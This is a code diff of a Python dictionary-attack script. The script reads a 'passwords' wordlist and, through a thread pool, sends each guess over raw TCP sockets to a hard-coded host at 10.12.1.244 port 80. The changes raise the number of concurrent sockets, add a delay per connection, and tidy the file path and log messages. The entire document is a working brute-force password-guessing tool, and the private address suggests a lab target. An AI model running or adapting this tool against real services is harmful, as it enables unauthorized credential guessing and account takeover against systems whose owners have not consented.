@@ -6,9 +6,11 @@ from os.path import abspath, exists
 from socket import *
 
 
-MAX_SOCKETS = 5
+MIN_DELAY_SECS = 30
+MAX_SOCKETS = 15
 SERVER_NAME = '10.12.1.244'
 SERVER_PORT = 80
+DICT_PATH = "passwords"
 
 
 def main():
@@ -16,7 +18,7 @@ def main():
 
     f_path = abspath("passwords")
     if exists(f_path):
-        with open("passwords") as f:
+        with open(DICT_PATH) as f:
             # Yeah, this is a weird one.  zip_longest takes an unpacked list (*list_var).
             # We want n copies of a single (list_var * n) list because we're going to call n copies of the same iter.
             # In order to serialize n sockets.
@@ -27,24 +29,30 @@ def main():
                 for w in words:
                     attempts.append(w.strip())
 
-                pool.map(send_payload, attempts)
                 print("Processing {}".format(attempts))
+
+                # Pool.map(function, list) spawns a thread to run function(l) for l in list.
+                pool.map(send_payload, attempts)
+        print("\nFinished searching using dictionary file {}!\n".format(f.name))
+
     else:
-        print("failed to find path")
+        print("\nFailed to find path to 'passwords' file! {}\n".format(DICT_PATH))
 
     print("Stopping service ...\n")
     time.sleep(10)
-    print("Service stopped!")
+    print("Service stopped!\n")
 
 
 def send_payload(payload):
     # Create a TCP client socket
     # (AF_INET is used for IPv4 protocols)
     # (SOCK_STREAM is used for TCP)
+    # print("\nPayload: {}\n".format(payload))
     client_socket = socket(AF_INET, SOCK_STREAM)
     client_socket.connect((SERVER_NAME, SERVER_PORT))
 
     client_socket.send(payload.encode())
+    time.sleep(MIN_DELAY_SECS)
     client_socket.close()
 
 
